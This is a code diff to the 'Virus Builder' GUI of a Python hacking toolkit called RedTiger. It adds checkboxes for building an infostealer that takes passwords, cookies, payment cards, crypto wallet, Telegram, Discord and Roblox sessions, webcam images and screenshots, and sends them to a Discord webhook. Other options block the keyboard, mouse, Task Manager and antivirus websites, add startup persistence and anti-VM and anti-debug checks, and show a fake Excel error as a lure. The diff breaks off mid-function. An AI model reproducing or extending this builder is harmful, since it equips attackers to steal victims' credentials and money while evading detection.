@@ -12,27 +12,29 @@ from Config.Util import *
 from Config.Config import *
 try:
     import customtkinter as ctk
-    from tkinter import messagebox
     import tkinter
-    from tkinter import filedialog
     import os
     import json
     import shutil
     import random
     import string
     import ast
+    import base64
+    from tkinter import filedialog
+    from tkinter import messagebox
     from cryptography.hazmat.primitives import hashes
     from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
     from cryptography.hazmat.primitives import padding
     from cryptography.hazmat.backends import default_backend
-    import base64
 except Exception as e:
     ErrorModule(e)
 
 Title("Virus Builder")
 
 try:
+    exit_window = False
+
     colors = {
         "white"     : "#ffffff",
         "red"       : "#a80505",
@@ -43,21 +45,54 @@ try:
         "background": "#262626"
     }
 
+    def ClosingWindow():
+        global exit_window
+        exit_window = True
+        after_ids = builder.tk.eval('after info').split()
+        for after_id in after_ids:
+            try: builder.after_cancel(after_id)
+            except: pass
+
+        try: builder.quit()
+        except: pass
+        try: builder.destroy()
+        except: pass
+
+    def ClosingBuild():
+        after_ids = builder.tk.eval('after info').split()
+        for after_id in after_ids:
+            try: builder.after_cancel(after_id)
+            except: pass
+
+        try: builder.quit()
+        except: pass
+        try: builder.destroy()
+        except: pass
+
     builder = ctk.CTk()
     builder.title(f"RedTiger {version_tool} - Virus Builder")
-    builder.geometry("800x600")
+    builder.geometry("800x720")
     builder.resizable(False, False)
     builder.configure(fg_color=colors["background"])
     builder.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
 
     option_system                    = "Disable"
+    option_game_launchers            = "Disable"
+    option_wallets                   = "Disable"
+    option_apps                      = "Disable"
     option_discord                   = "Disable"
     option_discord_injection         = "Disable"
-    option_browser                   = "Disable"
+    option_passwords                 = "Disable"
+    option_cookies                   = "Disable"
+    option_history                   = "Disable"
+    option_downloads                 = "Disable"
+    option_cards                     = "Disable"
+    option_extentions                = "Disable"
+    option_interesting_files         = "Disable"
     option_roblox                    = "Disable"
-    option_camera_capture            = "Disable"
-    option_open_user_profil_settings = "Disable"
+    option_webcam                    = "Disable"
     option_screenshot                = "Disable"
+
     option_block_key                 = "Disable"
     option_block_mouse               = "Disable"
     option_block_task_manager        = "Disable"
@@ -75,13 +110,21 @@ try:
     file_type                        = "None"
 
     option_system_var                    = ctk.StringVar(value="Disable")
+    option_game_launchers_var            = ctk.StringVar(value="Disable")
+    option_wallets_var                   = ctk.StringVar(value="Disable")
+    option_apps_var                      = ctk.StringVar(value="Disable")
+    option_roblox_var                    = ctk.StringVar(value="Disable")
     option_discord_var                   = ctk.StringVar(value="Disable")
     option_discord_injection_var         = ctk.StringVar(value="Disable")
-    option_browser_var                   = ctk.StringVar(value="Disable")
-    option_roblox_var                    = ctk.StringVar(value="Disable")
-    option_camera_capture_var            = ctk.StringVar(value="Disable")
+    option_passwords_var                 = ctk.StringVar(value="Disable")
+    option_cookies_var                   = ctk.StringVar(value="Disable")
+    option_history_var                   = ctk.StringVar(value="Disable")
+    option_downloads_var                 = ctk.StringVar(value="Disable")
+    option_cards_var                     = ctk.StringVar(value="Disable")
+    option_extentions_var                = ctk.StringVar(value="Disable")
+    option_interesting_files_var         = ctk.StringVar(value="Disable")
+    option_webcam_var                    = ctk.StringVar(value="Disable")
     option_screenshot_var                = ctk.StringVar(value="Disable")
-    option_open_user_profil_settings_var = ctk.StringVar(value="Disable")
     option_block_key_var                 = ctk.StringVar(value="Disable")
     option_block_mouse_var               = ctk.StringVar(value="Disable")
     option_block_task_manager_var        = ctk.StringVar(value="Disable")
@@ -123,7 +166,7 @@ try:
     text.grid(row=2, pady=0, columnspan=3, sticky="we")
 
     url = ctk.CTkLabel(title_frame, text=github_tool, font=ctk.CTkFont(family="Helvetica", size=15))
-    url.grid(row=3, pady=(3, 15), columnspan=3, sticky="we")
+    url.grid(row=3, pady=(3, 10), columnspan=3, sticky="we")
 
     webhook_url = ctk.CTkEntry(title_frame, height=45, width=350, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=15), justify="center", border_color=colors["red"], fg_color=colors["dark_gray"], border_width=2, placeholder_text="https://discord.com/api/webhooks/...")
     webhook_url.grid(row=4, column=0, padx=(150, 5), pady=10, sticky="we")
@@ -131,12 +174,19 @@ try:
     test_webhook = ctk.CTkButton(title_frame, text="Test Webhook", command=TestWebhook, height=45, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
     test_webhook.grid(row=4, column=1, padx=(5, 150), pady=10, sticky="we")
 
-    options_frame = ctk.CTkFrame(builder, width=720, height=240, fg_color=colors["dark_gray"]) 
-    options_frame.grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
-    options_frame.grid_propagate(False)
-    options_frame.grid_columnconfigure(0, weight=1)
-    options_frame.grid_columnconfigure(1, weight=1)
-    options_frame.grid_columnconfigure(2, weight=1)
+    options_stealer_frame = ctk.CTkFrame(builder, width=720, height=209, fg_color=colors["dark_gray"]) 
+    options_stealer_frame.grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
+    options_stealer_frame.grid_propagate(False)
+    options_stealer_frame.grid_columnconfigure(0, weight=1)
+    options_stealer_frame.grid_columnconfigure(1, weight=1)
+    options_stealer_frame.grid_columnconfigure(2, weight=1)
+
+    options_malware_frame = ctk.CTkFrame(builder, width=720, height=150, fg_color=colors["dark_gray"]) 
+    options_malware_frame.grid(row=3, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
+    options_malware_frame.grid_propagate(False)
+    options_malware_frame.grid_columnconfigure(0, weight=1)
+    options_malware_frame.grid_columnconfigure(1, weight=1)
+    options_malware_frame.grid_columnconfigure(2, weight=1)
 
     def ChooseIcon():
         global icon_path
@@ -152,13 +202,6 @@ try:
         except:
             pass
         
-    def ToggleOpenUserprofile():
-        if option_screenshot_var.get() == "Enable":
-            option_open_user_profil_settings_cb.configure(state="normal", border_color=colors['red'])
-        else:
-            option_open_user_profil_settings_cb.configure(state="disable", border_color=colors['dark_red'])
-            option_open_user_profil_settings_cb.deselect() 
-
     fake_error_title         = "Microsoft Excel"
     fake_error_message       = "The file is corrupt and cannot be opened."
     fake_error_window_status = True
@@ -175,7 +218,7 @@ try:
         fake_error_window = ctk.CTkToplevel(builder)
         fake_error_window.title(f"RedTiger {version_tool} - Fake Error")
 
-        fake_error_window.geometry("300x210")
+        fake_error_window.geometry("300x250")
         fake_error_window.resizable(False, False)
         fake_error_window.configure(fg_color=colors["background"])
 
@@ -189,56 +232,78 @@ try:
             global fake_error_title, fake_error_message
             fake_error_title = fake_error_title_entry.get()
             fake_error_message = fake_error_message_entry.get()
-            fake_error_window.destroy()
+            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Title  : {white + fake_error_title}")
+            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Message: {white + fake_error_message}")
+            fake_error_window.quit()
             
         validate_button = ctk.CTkButton(fake_error_window, text="Validate", command=Validate, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14), height=40, width=100)
         validate_button.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
         fake_error_window.mainloop()
 
-    option_system_cb                    = ctk.CTkCheckBox(options_frame, text="System Info",        variable=option_system_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_discord_cb                   = ctk.CTkCheckBox(options_frame, text="Discord Token",      variable=option_discord_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_discord_injection_cb         = ctk.CTkCheckBox(options_frame, text="Discord Injection",  variable=option_discord_injection_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_browser_cb                   = ctk.CTkCheckBox(options_frame, text="Browser Steal",      variable=option_browser_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_roblox_cb                    = ctk.CTkCheckBox(options_frame, text="Roblox Cookie",      variable=option_roblox_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_camera_capture_cb            = ctk.CTkCheckBox(options_frame, text="Camera Capture",     variable=option_camera_capture_var,            onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_screenshot_cb                = ctk.CTkCheckBox(options_frame, text="Screenshot",         variable=option_screenshot_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), command=ToggleOpenUserprofile)
-    option_open_user_profil_settings_cb = ctk.CTkCheckBox(options_frame, text="Open UserProfile",   variable=option_open_user_profil_settings_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=15), state="disable")
-    option_block_key_cb                 = ctk.CTkCheckBox(options_frame, text="Block Key",          variable=option_block_key_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_block_mouse_cb               = ctk.CTkCheckBox(options_frame, text="Block Mouse",        variable=option_block_mouse_var,               onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_block_task_manager_cb        = ctk.CTkCheckBox(options_frame, text="Block Task Manager", variable=option_block_task_manager_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_block_website_cb             = ctk.CTkCheckBox(options_frame, text="Block AV Website",   variable=option_block_website_var,             onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_shutdown_cb                  = ctk.CTkCheckBox(options_frame, text="Shutdown",           variable=option_shutdown_var,                  onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_spam_open_programs_cb        = ctk.CTkCheckBox(options_frame, text="Spam Open Program",  variable=option_spam_open_programs_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_spam_create_files_cb         = ctk.CTkCheckBox(options_frame, text="Spam Create File",   variable=option_spam_create_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_fake_error_cb                = ctk.CTkCheckBox(options_frame, text="Fake Error",         variable=option_fake_error_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), command=CreateFakeErrorWindow)
-    option_startup_cb                   = ctk.CTkCheckBox(options_frame, text="Launch at Startup",  variable=option_startup_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_restart_cb                   = ctk.CTkCheckBox(options_frame, text="Restart Every 5min", variable=option_restart_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
-    option_anti_vm_and_debug_cb         = ctk.CTkCheckBox(options_frame, text="Anti VM & Debug",    variable=option_anti_vm_and_debug_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
- 
-    option_system_cb.grid(                   row=4,  column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
-    option_discord_cb.grid(                  row=5,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
-    option_discord_injection_cb.grid(        row=6,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
-    option_browser_cb.grid(                  row=7,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
-    option_roblox_cb.grid(                   row=8,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
-    option_camera_capture_cb.grid(           row=9,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
-    option_screenshot_cb.grid(               row=10, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+    option_system_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="System Info",            variable=option_system_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_wallets_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Wallets Session Files",  variable=option_wallets_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_game_launchers_cb            = ctk.CTkCheckBox(options_stealer_frame, text="Games Session Files",    variable=option_game_launchers_var,            onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_apps_cb                      = ctk.CTkCheckBox(options_stealer_frame, text="Telegram Session Files", variable=option_apps_var,                      onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_roblox_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="Roblox Accounts",        variable=option_roblox_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_discord_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Discord Accounts",       variable=option_discord_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_discord_injection_cb         = ctk.CTkCheckBox(options_stealer_frame, text="Discord Injection",      variable=option_discord_injection_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_passwords_cb                 = ctk.CTkCheckBox(options_stealer_frame, text="Passwords",              variable=option_passwords_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_cookies_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Cookies",                variable=option_cookies_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_history_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Browsing History",       variable=option_history_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_downloads_cb                 = ctk.CTkCheckBox(options_stealer_frame, text="Download History",       variable=option_downloads_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_cards_cb                     = ctk.CTkCheckBox(options_stealer_frame, text="Cards",                  variable=option_cards_var,                     onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_extentions_cb                = ctk.CTkCheckBox(options_stealer_frame, text="Extentions",             variable=option_extentions_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_interesting_files_cb         = ctk.CTkCheckBox(options_stealer_frame, text="Interesting Files",      variable=option_interesting_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_webcam_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="Webcam",                 variable=option_webcam_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_screenshot_cb                = ctk.CTkCheckBox(options_stealer_frame, text="Screenshot",             variable=option_screenshot_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    
+    option_block_key_cb                 = ctk.CTkCheckBox(options_malware_frame, text="Block Key",              variable=option_block_key_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_block_mouse_cb               = ctk.CTkCheckBox(options_malware_frame, text="Block Mouse",            variable=option_block_mouse_var,               onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_block_task_manager_cb        = ctk.CTkCheckBox(options_malware_frame, text="Block Task Manager",     variable=option_block_task_manager_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_block_website_cb             = ctk.CTkCheckBox(options_malware_frame, text="Block AV Website",       variable=option_block_website_var,             onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_shutdown_cb                  = ctk.CTkCheckBox(options_malware_frame, text="Shutdown",               variable=option_shutdown_var,                  onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_fake_error_cb                = ctk.CTkCheckBox(options_malware_frame, text="Fake Error",             variable=option_fake_error_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], command=CreateFakeErrorWindow)
+    option_spam_open_programs_cb        = ctk.CTkCheckBox(options_malware_frame, text="Spam Open Program",      variable=option_spam_open_programs_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_spam_create_files_cb         = ctk.CTkCheckBox(options_malware_frame, text="Spam Create File",       variable=option_spam_create_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_anti_vm_and_debug_cb         = ctk.CTkCheckBox(options_malware_frame, text="Anti VM & Debug",        variable=option_anti_vm_and_debug_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_startup_cb                   = ctk.CTkCheckBox(options_malware_frame, text="Launch at Startup",      variable=option_startup_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    option_restart_cb                   = ctk.CTkCheckBox(options_malware_frame, text="Restart Every 5min",     variable=option_restart_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
+    
+    option_system_cb.grid(                   row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
+    option_wallets_cb.grid(                  row=2, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+    option_game_launchers_cb.grid(           row=3, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+    option_apps_cb.grid(                     row=4, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+    option_roblox_cb.grid(                   row=5, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+    option_discord_cb.grid(                  row=6, column=0, padx=(60, 0), pady=3,      sticky="nswe")
 
-    option_open_user_profil_settings_cb.grid(row=4, column=1, padx=(0, 0), pady=(18,3),   sticky="nswe")
-    option_block_key_cb.grid(                row=5, column=1, padx=(0, 0), pady=3,        sticky="nswe")
-    option_block_mouse_cb.grid(              row=6, column=1, padx=(0, 0), pady=3,        sticky="nswe")
-    option_block_task_manager_cb.grid(       row=7, column=1, padx=(0, 0), pady=3,        sticky="nswe")
-    option_block_website_cb.grid(            row=8, column=1, padx=(0, 0), pady=3,        sticky="nswe")
-    option_shutdown_cb.grid(                 row=9, column=1, padx=(0, 0), pady=3,        sticky="nswe")
+    option_discord_injection_cb.grid(        row=1, column=1, padx=(0, 0),  pady=(18,3), sticky="nswe")
+    option_passwords_cb.grid(                row=2, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_cookies_cb.grid(                  row=3, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_history_cb.grid(                  row=4, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_downloads_cb.grid(                row=5, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_cards_cb.grid(                    row=6, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
 
-    option_spam_open_programs_cb.grid(       row=4, column=2, padx=(0, 0), pady=(18,3),   sticky="nswe")
-    option_spam_create_files_cb.grid(        row=5, column=2, padx=(0, 0), pady=3,        sticky="nswe")
-    option_fake_error_cb.grid(               row=6, column=2, padx=(0, 0), pady=3,        sticky="nswe")
-    option_startup_cb.grid(                  row=7, column=2, padx=(0, 0), pady=3,        sticky="nswe")
-    option_restart_cb.grid(                  row=8, column=2, padx=(0, 0), pady=3,        sticky="nswe")
-    option_anti_vm_and_debug_cb.grid(        row=9, column=2, padx=(0, 0), pady=3,        sticky="nswe")
+    option_extentions_cb.grid(               row=1, column=2, padx=(0, 0),  pady=(18,3), sticky="nswe")
+    option_interesting_files_cb.grid(        row=2, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_webcam_cb.grid(                   row=3, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_screenshot_cb.grid(               row=4, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
 
+    option_block_key_cb.grid(                row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
+    option_block_mouse_cb.grid(              row=2, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+    option_block_task_manager_cb.grid(       row=3, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+    option_block_website_cb.grid(            row=4, column=0, padx=(60, 0), pady=3,      sticky="nswe")
+
+    option_spam_open_programs_cb.grid(       row=1, column=1, padx=(0, 0),  pady=(18,3), sticky="nswe")
+    option_spam_create_files_cb.grid(        row=2, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_shutdown_cb.grid(                 row=3, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_fake_error_cb.grid(               row=4, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
+
+    option_anti_vm_and_debug_cb.grid(        row=1, column=2, padx=(0, 0),  pady=(18,3), sticky="nswe")
+    option_startup_cb.grid(                  row=2, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
+    option_restart_cb.grid(                  row=3, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
+    
     build_frame = ctk.CTkFrame(builder, width=720, height=40, fg_color=colors["background"]) 
-    build_frame.grid(row=3, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
+    build_frame.grid(row=4, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
     build_frame.grid_propagate(False)
     build_frame.grid_columnconfigure(0, weight=1)
     build_frame.grid_columnconfigure(1, weight=1)
@@ -266,14 +331,22 @@ try:
     build_frame.grid_columnconfigure(0, minsize=0)
 
     def BuildSettings():
-        global option_system, option_discord, option_discord_injection, option_browser, option_roblox, option_camera_capture, option_open_user_profil_settings, option_screenshot, option_block_key, option_block_mouse, option_block_task_manager, option_block_website, option_spam_open_programs, option_spam_create_files, option_shutdown ,option_fake_error,  option_startup, option_restart, option_anti_vm_and_debug, webhook, name_file, file_type, icon_path
+        global option_system, option_game_launchers, option_wallets, option_apps, option_discord, option_discord_injection, option_passwords, option_cookies, option_history, option_downloads, option_cards, option_extentions, option_interesting_files, option_roblox, option_webcam, option_screenshot, option_block_key, option_block_mouse, option_block_task_manager, option_block_website, option_spam_open_programs, option_spam_create_files, option_shutdown ,option_fake_error,  option_startup, option_restart, option_anti_vm_and_debug, webhook, name_file, file_type, icon_path
         option_system                    = option_system_var.get()
+        option_game_launchers            = option_game_launchers_var.get()
+        option_wallets                   = option_wallets_var.get()
+        option_apps                      = option_apps_var.get()
         option_discord                   = option_discord_var.get()
         option_discord_injection         = option_discord_injection_var.get()
-        option_browser                   = option_browser_var.get()
+        option_passwords                 = option_passwords_var.get()
+        option_cookies                   = option_cookies_var.get()
+        option_history                   = option_history_var.get()
+        option_downloads                 = option_downloads_var.get()
+        option_cards                     = option_cards_var.get()
+        option_extentions                = option_extentions_var.get()
+        option_interesting_files         = option_interesting_files_var.get()
         option_roblox                    = option_roblox_var.get()
-        option_camera_capture            = option_camera_capture_var.get()
-        option_open_user_profil_settings = option_open_user_profil_settings_var.get()
+        option_webcam                    = option_webcam_var.get()
         option_screenshot                = option_screenshot_var.get()
         option_block_website             = option_block_website_var.get()
         option_block_key                 = option_block_key_var.get()
@@ -302,28 +375,43 @@ try:
             ErrorLogs("Please choose the file type.")
             return
         
-        builder.quit()
-        builder.destroy()
+        ClosingBuild()
 
     build = ctk.CTkButton(builder, text="Build", command=BuildSettings, height=40, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
     build.grid(row=5, column=0, padx=330, pady=30, sticky="nswe")
 
+    builder.protocol("WM_DELETE_WINDOW", ClosingWindow)
+
     builder.mainloop()
+
+    if not exit_window:
+        builder.destroy()
+
+    time.sleep(1)
 
     if file_type == "File Type" or file_type == "None" or not name_file.strip() or name_file == "None" or not webhook.strip() or webhook == "None":
         ErrorLogs("You have closed the page, so your virus will not be built.")
         Continue()
         Reset()
 
+    option_extentions                = option_extentions_var.get()
+    option_interesting_files         = option_interesting_files_var.get()   
+
     print(f"""
-    {option_system           } System Info         {option_open_user_profil_settings} Open UserProfil     {option_spam_open_programs} Spam Open Program
-    {option_discord          } Discord Token       {option_block_key                } Block Key           {option_spam_create_files } Spam Create File
-    {option_discord_injection} Discord Injection   {option_block_mouse              } Block Mouse         {option_fake_error        } Fake Error
-    {option_browser          } Browser Steal       {option_block_task_manager       } Block Task Manager  {option_startup           } Launch at Startup
-    {option_roblox           } Roblox Cookie       {option_block_website            } Block AV Website    {option_restart           } Restart Every 5min
-    {option_camera_capture   } Camera Capture      {option_shutdown                 } Shutdown            {option_anti_vm_and_debug } Anti VM & Debug
-    {option_screenshot       } Screenshot
-    """.replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))
+    {red}Stealer Options:{white}
+    {option_system            } System Info            {option_discord_injection } Discord Injection      {option_extentions       } Extentions
+    {option_wallets           } Wallets Session Files  {option_passwords         } Passwords              {option_interesting_files} Interesting Files                   
+    {option_game_launchers    } Games Session Files    {option_cookies           } Cookies                {option_webcam           } Webcam 
+    {option_apps              } Telegram Session Files {option_history           } Browsing History       {option_screenshot       } Screenshot
+    {option_roblox            } Roblox Accounts        {option_downloads         } Download History
+    {option_discord           } Discord Accounts       {option_cards             } Cards
+
+    {red}Malware Options:{white}
+    {option_block_key         } Block Key              {option_shutdown          } Shutdown               {option_anti_vm_and_debug} Anti VM & Debug
+    {option_block_mouse       } Block Mouse            {option_fake_error        } Fake Error             {option_startup          } Launch at Startup
+    {option_block_task_manager} Block Task Manager     {option_spam_open_programs} Spam Open Program      {option_restart          } Restart Every 5min
+    {option_block_website     } Block AV Website       {option_spam_create_files } Spam Create File
+""".replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))
 
     if option_fake_error == "Enable":
         print(f"""{red}Fake Error Title   : {white + fake_error_title}
@@ -373,6 +461,27 @@ try:
     def PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted):
         if file_type in ["Exe File", "Python File"]:
             try:
+                browser_choice = []
+                if option_extentions == 'Enable':
+                    browser_choice.append('"extentions"')
+                if option_passwords == 'Enable':
+                    browser_choice.append('"passwords"')
+                if option_cookies == 'Enable':
